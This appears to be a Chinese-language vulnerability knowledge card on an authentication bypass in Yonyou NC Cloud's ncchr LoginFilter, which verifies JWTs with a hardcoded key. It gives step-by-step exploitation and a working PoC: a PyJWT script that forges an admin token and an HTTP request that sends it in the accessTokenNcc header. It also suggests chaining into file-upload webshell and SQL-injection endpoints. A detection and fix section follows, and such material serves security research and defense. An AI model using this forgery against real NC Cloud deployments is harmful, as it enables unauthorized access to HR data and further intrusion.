---
id: web-java-component-yonyou-nccloud-ncchr-loginfilter-jwt-defaultsecret-bypass
title: 用友 NC Cloud ncchr LoginFilter 鉴权绕过：JWT 密钥硬编码 defaultSecret，自签 accessTokenNcc 头即放行
type: scenario
domain: web
path: web/java/component
technique: yonyou-nccloud-ncchr-loginfilter-hardcoded-jwt-secret-forgery
aliases:
- 用友 NC Cloud 鉴权绕过
- ncchr LoginFilter 绕过
- accessTokenNcc 伪造
- 用友 NCCloud JWT 硬编码密钥
- JwtTokenUtil defaultSecret
- validAccessToken 绕过
- ncchr 未授权访问
tags:
- java
- yonyou
- nccloud
- ncchr
- jwt
- hardcoded-secret
- auth-bypass
- servlet-filter
- token-forgery
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V626
  verified_at: '2026-11-12T23:26:15+08:00'
  notes: 已通读原文并逐张核对22张图：web.xml nccLoginFilter映射LoginFilter与/ncchr/*、doFilterInternal四分支、validAccessToken取accessTokenNcc并写InvocationInfoProxy+ensureSecurity、JwtProperties secret=defaultSecret/md5Key=randomKey/expiration=86400L、getClaimFromToken用getSecret验签，均与卡一致；原文请求携带accessTokenNcc JWT访问queryStaffByName返回200与JSON（data为空），已按截图修正“与业务数据”的表述。dedup：与NC65 PortalLoginFilter、U8Cloud HMAC、Nacos/AJ-Report/Lin-CMS等硬编码JWT卡均为不同产品/实现/接口，非同链；dup-scan无涉及pair。affected_versions原文未给未设置。未验证点：未本机复现，原文未展示自签token的生成过程。
---

## 一句话结论

用友 NC Cloud 的 `ncchr` 前端应用由 `com.yonyou.hrcloud.ncc.auth.web.LoginFilter`（`OncePerRequestFilter`）保护，其 `validAccessToken` 分支把请求头 `accessTokenNcc` 当作 JWT，用 `JwtProperties` 中**硬编码的默认密钥 `defaultSecret`** 验签；攻击者用该公开常量自签 HS256 JWT 放入 `accessTokenNcc` 头，即可通过 `validSession || validToken || validAccessToken || isExcludedPage` 任一为真的放行逻辑，未授权访问 `/ncchr/*` 下全部后台接口。

## 原理

- **过滤器注册**：`web.xml` 把 `nccLoginFilter` 映射到 `com.yonyou.hrcloud.ncc.auth.web.LoginFilter`，`<url-pattern>/ncchr/*</url-pattern>`；`LoginFilter` 继承 Spring 的 `OncePerRequestFilter`，鉴权逻辑在 `doFilterInternal`。
- **放行条件**：`doFilterInternal` 中只要 `validSession(request) || validToken(request) || validAccessToken(request) || isExcludedPage(request)` 任一返回 true 就 `filterChain.doFilter(...)` 进入业务，否则 `loginError(...)`。因此攻破任意一个校验分支即可。
- **validAccessToken 分支**：从 `request.getHeader(ACCESSTKEN_NCC)`（常量值 `accessTokenNcc`）取 token，非空时经 `JwtTokenUtil.getInstance().getPrivateClaimFromToken(token, claimKey)` 解析，把 userid、groupId、dataSource、deviceId、userCode、langCode 等 claim 写入 `InvocationInfoProxy`，再调用 `LoginHelper.ensureSecurity()`（`NetStreamContext.setToken(genTokens())` 生成安全令牌）后 `return true`。
- **JWT 验签实现**：
  ```java
  public Claims getClaimFromToken(String token) {
      return (Claims) Jwts.parser()
          .setSigningKey(this.jwtProperties.getSecret())
          .parseClaimsJws(token).getBody();
  }
  ```
  而 `JwtProperties` 的字段是硬编码默认值：`secret = "defaultSecret"`，另有 `md5Key = "randomKey"`、`expiration = 86400L` 等。
- **为什么成立**：HMAC 密钥是客户端可控字符串之外唯一的信任根，一旦它是可从安装包/jar 反编译读出的常量，签名的“不可伪造性”就消失。攻击者按同样的 HS256 算法用 `defaultSecret` 对任意 claims 签名，`parseClaimsJws` 验签必然通过；`validAccessToken` 只要求解析成功并设置代理上下文，不额外比对 token 签发方、有效期来源或用户状态，因此任意伪造 token 均被视为合法。
- **注意**：`parseClaimsJws` 会校验 `exp`。自签时写入未来过期时间即可；claims 的键名以目标版本 `NccLoginConst` 中的常量（如 `Userid`、`Pk_group`、`Device…`、`Usercode`、`Lang…`）为准，但伪造时 values 不必对应真实用户——只要签名正确就放行。

## 触发条件

- 目标为使用 `ncchr` 服务的用友 NC Cloud 版本，`LoginFilter` 尚未修复（仍以 `defaultSecret` 验签 `accessTokenNcc`）。
- 攻击者能访问 `/ncchr/*` 任意路由。
- 能从安装包/jar 或本卡给出的默认值获得 JWT 密钥（默认 `defaultSecret`）。
- 目标未在前面再加独立网关鉴权，且后续接口不依赖有效会话数据做二次校验（部分接口依赖 `InvocationInfoProxy` 中的 userid 等做数据过滤，伪造时建议填一个存在的用户编码以取得完整数据面）。

## 利用步骤

1. 确认 `ncchr` 路由存在：未带任何凭据访问 `/ncchr/...` 业务接口，观察被 `loginError` 拒绝（跳登录/错误 JSON）。
2. 用 `defaultSecret` 生成 HS256 JWT，claims 填入目标版本 `NccLoginConst` 对应的键（userid/group/datasource/deviceId/userCode/langCode），`exp` 设为未来。
3. 在请求头加入 `accessTokenNcc: <JWT>`，重新请求同一接口，确认不再被过滤器拦截而是返回业务数据。
4. 以该头为前提访问下游敏感接口（如本文关联的分片上传、员工查询等），继续利用。

## PoC

最小化伪造（密钥取自反编译常量；claim 键名以目标版本 `NccLoginConst` 为准，可用空对象加有效 `exp` 先验证放行）：

```python
import jwt  # PyJWT
token = jwt.encode(
    {"Userid": "admin", "Usercode": "admin", "Pk_group": "0001",
     "DeviceId": "web", "LangCode": "zh"},
    "defaultSecret",
    algorithm="HS256",
)
print(token)
```

```http
GET /ncchr/<任意后台接口> HTTP/1.1
Host: target
accessTokenNcc: <上一步生成的 JWT>
```

原文实测请求携带 `accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` 头访问 `/ncchr/pm/staff/queryStaffByName`，返回 `HTTP 200` 与 JSON 响应（截图 `data` 为空），说明该头通过了 LoginFilter 鉴权；结合 `JwtProperties` 硬编码 `defaultSecret`，可用同一 HS256 密钥自签任意 claims 的 token。

## 变体与关联

- **其他校验分支**：同一过滤器还接受 `NCCloudSessionID` cookie（`validSession`）与 `accesstoken` 头（`validToken`）；若 JWT 分支被修补，可检查这些分支是否仍有硬编码/弱校验。
- **下游利用**：通过本绕过可直接触达 [[web-java-component-yonyou-nccloud-attachment-uploadchunk-fileguid-traversal]]（任意文件上传写 JSP）与 [[web-java-component-yonyou-nccloud-staff-querystaffbyname-sqli]]（Oracle SQL 注入）等接口。
- **同类问题**：其他硬编码 JWT 密钥场景见 [[web-java-component-nacos-default-token-secret-key-jwt-forge]]、[[web-generic-jwt-hugegraph-hardcoded-secret-token-forgery]]；同厂商其他鉴权绕过见 [[web-generic-auth-yonyou-nc65-portalloginfilter-bypass]]（NC65 是 magic 参数/白名单子串，机制不同）。
- **检索要点**：`JwtTokenUtil`、`JwtProperties`、`NccLoginConst`、`accessTokenNcc` 可用于在同厂商其他 jar 中定位同类硬编码密钥。

## 检测与防御

- **修复**：JWT 密钥改为部署时随机生成（每实例独立）并放入受保护配置/密钥管理服务，禁止源码与 jar 内硬编码默认值；`setSigningKey` 前校验算法白名单（仅 HS256/RS256 之一），校验 token 的签发方与用户状态。
- **升级**：联系厂商获取 NC Cloud 安全补丁，核对 `JwtProperties` 默认密钥是否已下线。
- **检测**：流量中出现 `accessTokenNcc` 头且为 HS256 JWT、同一来源未经过登录流程直接访问 `/ncchr/*` 业务接口；JWT 中 `exp` 正常但 `userId/userCode` 与真实会话不匹配；日志中 `>>>accessTokenNcc:` 打印值与登录用户不对应。
- **纵深防御**：网关统一鉴权，不依赖单个 Filter；敏感接口二次校验会话与权限；对 `/ncchr/*` 做来源白名单。
